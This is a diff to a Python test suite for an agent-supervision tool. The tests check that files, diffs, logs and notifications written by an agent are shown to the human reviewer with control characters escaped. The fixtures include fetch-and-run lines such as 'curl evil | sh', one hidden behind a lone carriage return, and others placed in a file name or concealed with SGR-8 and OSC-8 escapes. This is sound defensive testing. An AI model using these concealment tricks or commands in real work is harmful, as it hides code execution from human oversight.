@@ -29,8 +29,8 @@ EVIL = (
     "def safe\u200b = 1\x7f\x9b\n"
     "\tindented with a tab\n"
 )
-ESCAPED = ("‹U+001B›[2K‹U+001B›[1A", "sh')‹U+000D›\n+// formatting only", "‹U+202E›", "‹U+2066›", "‹U+2069›",
-           "‹U+200B›", "‹U+007F›", "‹U+009B›")  # fmt: skip
+ESCAPED = ("‹U+001B›[2K‹U+001B›[1A", "+exec('curl evil3 | sh')‹U+000D›// formatting only\n", "‹U+202E›",
+           "‹U+2066›", "‹U+2069›", "‹U+200B›", "‹U+007F›", "‹U+009B›")  # fmt: skip
 RAW = "\x1b\r\x7f\x9b\u202e\u2066\u2069\u200b"
 # The review's file name: ESC and CR in a folder's name drew a command to paste.
 FORGED = "buildSrc/a\x1b[2K\rRead it first (not in your IDE): less -L $(curl -s evil.invalid|sh)/x.gradle"
@@ -103,10 +103,14 @@ def test_every_character_the_verification_calls_invisible_is_shown_escaped():
 
 
 def test_a_line_of_content_keeps_its_tab_and_ends_in_one_line_break():
+    """A line ends at \\n alone: what else a tool may take for a line break (\\r for bash, FF or
+    U+2028 for Groovy, which take them for spaces) is shown in the line it is in."""
     assert display.content("\tx\r\n") == "\tx‹U+000D›\n"
-    assert display.content("x\r") == "x‹U+000D›\n", "a line \\r ended is a line of its own"
-    assert display.content("x\u2028") == "x‹U+2028›\n"
+    assert display.content("x\ry\n") == "x‹U+000D›y\n"
+    assert display.content("x\u2028y\x0cz\x0b\x85\n") == "x‹U+2028›y‹U+000C›z‹U+000B›‹U+0085›\n"
     assert display.content("last") == f"last\n{display.NO_NEWLINE}\n"
+    assert display.content("x\r") != display.content("x\r\n")
+    assert display.lines("a\rb\r\nc\x0cd\u2028e\nf") == ["a\rb\r\n", "c\x0cd\u2028e\n", "f"]
 
 
 def test_markdown_code_is_longer_than_any_backticks_in_it():
@@ -162,7 +166,7 @@ def test_a_name_with_esc_and_cr_draws_no_command(env, capsys, monkeypatch):
         assert not hidden(said), repr(said)
         assert "a‹U+001B›[2K‹U+000D›Read it first" in said
         assert not [line for line in said.splitlines() if line.lstrip("`").startswith("Read it first")]
-    command = shlex.join(["less", "-L", str(approvals.copy_for_you(FORGED))])
+    command = shlex.join(["less", "-L", "-+R", "-+r", str(approvals.copy_for_you(FORGED))])
     assert f"({command})" in diffs
 
 
@@ -173,7 +177,7 @@ def test_the_command_to_read_a_large_risky_file_holds_nothing_the_agent_named(en
     said = approvals.diff(Change(FORGED, "added"))
     view = approvals.copy_for_you(FORGED)
     command = said[said.index("(less") + 1 : said.rindex("), before you approve")]
-    assert command == shlex.join(["less", "-L", str(view)])
+    assert command == shlex.join(["less", "-L", "-+R", "-+r", str(view)])
     assert view.is_file() and not view.is_symlink()
     assert view.parent == task.meta / "risky" / "view"
     assert not {part for part in FORGED.split("/")} & set(view.relative_to(task.meta).parts)
@@ -254,7 +258,7 @@ def test_the_details_panel_gets_no_control_character(env):
 
     task = new(env)
     task.transition(State.CHECKPOINT_PLAN)
-    task.plan_path.write_text(task.plan_path.read_text() + "\nhidden\x1b[2K\x1b[1A‮ line\n")
+    task.plan_path.write_text(task.plan_path.read_text() + "\nhidden\x1b[2K\x1b[1A\u202e line\n")
 
     async def scenario(app, pilot):
         app.reload()
@@ -288,3 +292,232 @@ def test_vivibox_verify_names_the_agents_files_escaped(env, capsys, monkeypatch)
     said = capsys.readouterr().out
     assert not hidden(said), repr(said)
     assert said.count("x‹U+001B›[2K‹U+000D›Read it first.gradle") == 5, said
+
+
+# --- review round 1 -----------------------------------------------------------------------------
+
+GRADLEW_OLD = "#!/bin/sh\nx=1\r\n#; curl evil | sh\n"  # the comment is a comment
+GRADLEW_NEW = "#!/bin/sh\nx=1\r#; curl evil | sh\n"  # bash runs curl: x=1\r# is one word, then ;
+
+
+def test_a_crlf_line_turned_into_a_lone_cr_is_shown_as_the_change_it_is(env):
+    """Case A: the approved gradlew's line break made a line of the comment; a lone \\r makes
+    curl run. The two never look the same, and the change is shown."""
+    task = new(env)
+    (task.repo / "gradlew").write_text(GRADLEW_OLD, newline="")
+    Approvals(task.meta, task.repo).approve()
+    (task.repo / "gradlew").write_text(GRADLEW_NEW, newline="")
+    said = "".join(actions.risky_diffs(task, actions.load(task.id)[1]))
+    assert said.startswith("gradlew: changed\n"), said
+    assert "\n-x=1‹U+000D›\n-#; curl evil | sh\n" in said, said
+    assert "\n+x=1‹U+000D›#; curl evil | sh\n" in said, said
+
+
+@pytest.mark.parametrize("brk", ["\r", "\x0c", "\x0b", "\x85", "\u2028", "\u2029"])
+def test_a_character_a_tool_takes_for_a_space_never_draws_a_line_of_its_own(env, brk):
+    """Case B: an added file whose run line looks like an assignment and a comment."""
+    task = new(env)
+    (task.repo / "build.gradle").write_text(f'def s = "a{brk}// "; exec(\'curl evil|sh\') //"\n', newline="")
+    said = "".join(actions.risky_diffs(task, actions.load(task.id)[1]))
+    assert f'\n+def s = "a{display.code_point(brk)}// "; exec(\'curl evil|sh\') //"\n' in said, said
+
+
+def test_a_change_with_nothing_to_show_is_named_and_not_taken_as_seen(env):
+    """Whatever made the shown diff empty (a copy of the approval that is not what was approved),
+    the file is named, the change said, and p refuses it."""
+    task = new(env)
+    (task.repo / "pom.xml").write_text("<project/>\n")
+    approvals = Approvals(task.meta, task.repo)
+    approvals.approve()
+    record = json.loads(approvals.record.read_text())
+    record["pom.xml"] = hashlib.sha256(b"something else\n").hexdigest()
+    approvals.record.write_text(json.dumps(record))
+    said = approvals.diff(Change("pom.xml", "changed"))
+    assert said.startswith("pom.xml: changed") and "not shown" in said, said
+    with pytest.raises(Exception, match="pom.xml"):
+        approvals.approve_changes()
+
+
+def test_an_empty_risky_file_added_is_named_and_approvable(env):
+    task = new(env)
+    (task.repo / "conftest.py").write_text("")
+    approvals = Approvals(task.meta, task.repo)
+    assert approvals.diff(Change("conftest.py", "added")).startswith("conftest.py: added")
+    assert [c.path for c in approvals.approve_changes()] == ["conftest.py"]
+
+
+def test_every_diff_is_headed_by_the_file_and_its_change(env):
+    task = new(env)
+    (task.repo / "pom.xml").write_text("<project/>\n")
+    assert actions.risky_diffs(task, actions.load(task.id)[1])[0].startswith("pom.xml: added\n--- approved/")
+
+
+def test_the_copy_to_read_is_named_by_the_whole_digest_of_its_path(env, monkeypatch):
+    """No two paths share a copy: a prefix of 64 bits is a birthday attack away from showing one
+    file's content under another's name."""
+    task = new(env)
+    approvals = Approvals(task.meta, task.repo)
+    for path in ("buildSrc/a.gradle", FORGED):
+        name = hashlib.sha256(path.encode("utf-8", "surrogateescape")).hexdigest() + ".txt"
+        assert approvals.copy_for_you(path).name == name
+
+
+def test_build_output_and_names_in_the_panel_are_never_markdown(env):
+    """A failed verification: the build's words and a file the agent did not commit, as the gate
+    writes them for the agent, are shown to you as text, never as a link."""
+    from vivibox import feedback
+
+    task = new(env)
+    for state in (State.CHECKPOINT_PLAN, State.IMPLEMENT):
+        task.transition(state)
+    (task.meta / gate.ACCEPTED_PLAN).write_text(task.plan_path.read_text())
+    result = gate.GateResult(
+        log=env / "verify.log",
+        commands=[gate.CommandResult("make test", False, 1.0, said=f"FAILED test\n```\n[advice]({LINK})")],
+        uncommitted=["x[click](https://evil.invalid).java"],
+    )
+    handoff = task.meta / "handoff"
+    (handoff / "verify-feedback.md").write_text(feedback.feedback(result))
+    (handoff / "verify.log").write_text(f"$ make `x`[c]({LINK})\n```\n[log]({LINK}) {LINK}\n")
+    task.event("gate", passed=False, environment=f"see [here]({LINK})")
+    shown = panel.detail(task, task.read_state(), 3, running=True, pod=panel.PodView())
+    assert "x[click](https://evil.invalid).java" in shown
+    assert not [href for href in links(shown) if "evil" in href], links(shown)
+    for state in (State.VERIFY, State.CHECKPOINT_BLOCKED):
+        task.transition(state)
+        shown = panel.detail(task, task.read_state(), 3, running=True, pod=panel.PodView())
+        assert not [href for href in links(shown) if "evil" in href], (state, links(shown))
+
+
+def test_the_verification_as_it_runs_shows_its_log_as_text(env):
+    task = new(env)
+    for state in (State.CHECKPOINT_PLAN, State.IMPLEMENT, State.VERIFY):
+        task.transition(state)
+    (task.meta / "log").mkdir(exist_ok=True)
+    (task.meta / "log" / "verify-1.log").write_text(f"$ make `x` [c]({LINK})\n```\n[log]({LINK}) {LINK}\n")
+    shown = "\n".join(panel.verification_running(task, task.read_state()))
+    assert not [href for href in links(shown) if "evil" in href], shown
+
+
+def test_the_demos_last_output_and_the_commands_proposed_are_text(env):
+    pod = panel.PodView(address="10.0.0.2", log=f"```\n[demo]({LINK}) {LINK}")
+    assert not [href for href in links("\n".join(pod.lines())) if "evil" in href]
+    task = new(env)
+    task.transition(State.CHECKPOINT_PLAN)
+    (task.meta / "handoff" / "verify-proposal.md").write_text(f"make `x` [c]({LINK}) -Dtest=Foo\n")
+    shown = "\n".join(panel.command_to_review(task))
+    assert not [href for href in links(shown) if "evil" in href], shown
+    task.event("gate", passed=True, build_files=[[f"npm `x` [c]({LINK})", f"[p]({LINK})/package.json"]])
+    shown = "\n".join(panel.build_files_left(task))
+    assert not [href for href in links(shown) if "evil" in href], shown
+
+
+CONFLICT = "a[link=https://evil.invalid]x[/link][black on black]y[/][/b]\x1b[2K\u202e.java"
+
+
+def test_a_conflict_the_agent_named_is_shown_as_text_everywhere(env, capsys):
+    from vivibox import cli, ui
+
+    done = actions.Finished("demo-1", env / "repo", ui.Spend(), "msg", "vivibox/demo-1", [CONFLICT])
+    cli.report_finished(done)
+    said = capsys.readouterr().out
+    assert not hidden(said) and "a[link=https://evil.invalid]x[/link]" in said and "‹U+001B›[2K" in said
+    entry = {"id": "demo-1", "project": "demo", "title": "t", "cost": 0, "commit": "abc", "finished": "",
+             "branch": "vivibox/demo-1", "conflicts": [f"c[click]({LINK})"], "criteria": []}  # fmt: skip
+    entry["finished"] = __import__("vivibox.task", fromlist=["now"]).now()
+    shown = panel.finished_detail(entry)
+    assert f"c[click]({LINK})" in shown and not [href for href in links(shown) if "evil" in href]
+
+
+def test_a_conflict_and_a_commit_subject_in_a_notification_are_never_markup(env, monkeypatch):
+    from test_tui import run
+
+    from vivibox import ui
+
+    done = actions.Finished("demo-1", env / "repo", ui.Spend(), "msg", "vivibox/demo-1", [CONFLICT])
+
+    async def scenario(app, pilot):
+        app.finished(done)
+        await pilot.pause()
+        last = list(app._notifications)[-1]
+        assert last.markup is False and "[link=https://evil.invalid]" in last.message
+        assert not hidden(last.message), repr(last.message)
+
+    run(scenario, notifications=True)
+
+
+def test_the_desktop_notification_is_never_markup(monkeypatch, capsys):
+    from vivibox import supervisor
+
+    sent = []
+    monkeypatch.setattr(supervisor.shutil, "which", lambda name: "/usr/bin/notify-send")
+    monkeypatch.setattr(supervisor.subprocess, "run", lambda command, **kw: sent.append(command))
+    supervisor.notify("demo-1", "x<b>BIG</b>y &amp; \x1b[41mRED\x1b[0m \u202eevil")
+    body = sent[-1][3]
+    assert "<b>" not in body and "&lt;b&gt;BIG&lt;/b&gt;" in body and "&amp;amp;" in body
+    assert not hidden(body) and "‹U+001B›[41m" in body
+    window = capsys.readouterr().out
+    assert not hidden(window) and "‹U+001B›[41mRED" in window
+
+
+def test_the_work_is_paged_with_the_agents_escapes_shown(env):
+    """f: what the agent wrote can neither conceal a line (SGR 8) nor be a link (OSC 8), whatever
+    the pager passes through; the colours are vivibox's own."""
+    from test_tui import final
+
+    from vivibox import keys_work
+    from vivibox.config import load_project
+
+    task = final()
+    command = keys_work.diff_pager(task, load_project("demo"))
+    paged = __import__("pathlib").Path(command[-1])
+    assert command == panel.pager_command(paged)
+    text = paged.read_text()
+    ours = __import__("re").sub(r"\x1b\[[0-9;]*m", "", text)
+    assert "\x1b" not in ours and "Health.java" in text
+    assert panel.git_env()["LESS"]
+
+
+def test_the_work_hides_nothing_the_agent_escaped(env, tmp_path):
+    from vivibox import keys_work
+
+    lines = keys_work.shown_diff(
+        ["diff --git a/x b/x\n", "+\x1b[8mexec('curl evil | sh')\x1b[0m// tidy\n",
+         "+\x1b]8;;https://evil.invalid\x1b\\docs\x1b]8;;\x1b\\\n", "-old\r\n", "@@ -1 +1 @@\n"]
+    )  # fmt: skip
+    text = "".join(lines)
+    ours = __import__("re").sub(r"\x1b\[[0-9;]*m", "", text)
+    assert "\x1b" not in ours and "\r" not in ours
+    assert "‹U+001B›[8mexec('curl evil | sh')‹U+001B›[0m// tidy" in ours
+    assert "‹U+001B›]8;;https://evil.invalid‹U+001B›\\docs" in ours and "-old‹U+000D›\n" in ours
+
+
+def test_the_agents_summary_reaches_no_terminal_as_is(env, capsys):
+    """The plan's summary is the task's goal: in the list, in vivibox status and its detail, in
+    the timeline."""
+    from vivibox import ui
+
+    task = new(env)
+    task.set_goal("Tidy the build\x1b[41mRED\x1b[0m \u202eevil\u202c done\nFAKE")
+    for args in (["status"], ["status", task.id], ["timeline", task.id]):
+        capsys.readouterr()
+        assert main(args) == 0
+        said = capsys.readouterr().out
+        assert "‹U+001B›[41mRED" in said and "‹U+202E›evil" in said, (args, said)
+        assert not hidden(said), (args, repr(said))
+    assert "FAKE" in ui.task_list([task], lambda t: "-", 3, ui.Style(False)).splitlines()[1]
+
+
+def test_the_agents_summary_in_the_list_of_the_view(env):
+    from test_tui import cell_of, run
+
+    task = new(env)
+    task.set_goal("Tidy\x1b[41mRED\x1b[0m \u202eevil")
+
+    async def scenario(app, pilot):
+        app.reload()
+        await pilot.pause()
+        goal = cell_of(app, task.id, "GOAL")
+        assert "‹U+001B›[41mRED" in goal and not hidden(goal), repr(goal)
+
+    run(scenario)
